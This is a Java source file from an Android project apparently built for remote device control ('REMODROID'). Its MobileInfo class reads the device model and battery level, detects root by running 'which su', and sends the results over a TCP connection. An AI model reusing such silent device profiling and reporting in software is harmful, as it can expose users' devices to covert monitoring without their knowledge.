package com.remo.Features;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.util.Log;
import com.remo.App;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;

import java.io.File;

/**
 * Created by Mohamed on 3/3/2018.
 */

public class MobileInfo extends Feature {
    //private String Manufacturer = "";
    //private String Battery = "";
//    private TCP_Transceiver tcp;
    public static boolean isRooted = false;

    public MobileInfo() {
         isRooted = isMobRooted();
//         Log.d("REMODROID","IS ROOTED = " + isRooted);
        UseMainConnection = false;
        Feature_type = DataHandler.eDataType.INFO.ordinal();
    }

    private String getInfo(Context context) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);

        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : 0;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : 0;

        float batteryPct = (level / (float) scale) * 100;

        String device = Build.MANUFACTURER + " " + Build.MODEL;
        return device + "/" + ((int) batteryPct);
    }

    private void sendInfo(Context context) {
        //Log.d("REMODROID", "4");
        //connect();
        Log.d("REMODROID", tcp.isConnected + "");
        //Log.d("REMODROID", "5");
        try {
            //Log.d("REMODROID", "6");
            sendPacket(((getInfo(context)).getBytes("UTF-8")));
            //Log.d("REMODROID", "7");
        } catch (Exception e) {
            Log.e("REMODROID", e.getMessage());
            //reportError("Error");
        }

    }

    @Override
    public void AsyncTaskFunc(String Params) {
        sendInfo(App.get().getApplicationContext());
    }

    @Override
    public void update(String Params) {

    }

//    @Override
//    public void connect() {
//        try {
//            this.tcp = TCP_Transceiver.MainConn;
//        } catch (Exception ex) {
//            Log.e("REMODROID", ex.getMessage());
//        }
//
//    }
//
//    @Override
//    public void sendPacket(byte[] data) {
//        tcp.send(DataHandler.eDataType.DATA_TYPE_INFO.ordinal(), data);
//    }







    private static boolean isMobRooted() {

        // get from build info
        String buildTags = android.os.Build.TAGS;
        if (buildTags != null && buildTags.contains("test-keys")) {
            return true;
        }

        // check if /system/app/Superuser.apk is present
        try {
            File file = new File("/system/app/Superuser.apk");
            if (file.exists()) {
                return true;
            }
        } catch (Exception e1) {
            // ignore
        }

        // try executing commands
        return canExecuteCommand("/system/xbin/which su")
                || canExecuteCommand("/system/bin/which su") || canExecuteCommand("which su");
    }

    // executes a command on the system
    private static boolean canExecuteCommand(String command) {
        boolean executedSuccesfully;
        try {
            Runtime.getRuntime().exec(command);
            executedSuccesfully = true;
        } catch (Exception e) {
            executedSuccesfully = false;
        }

        return executedSuccesfully;
    }





}
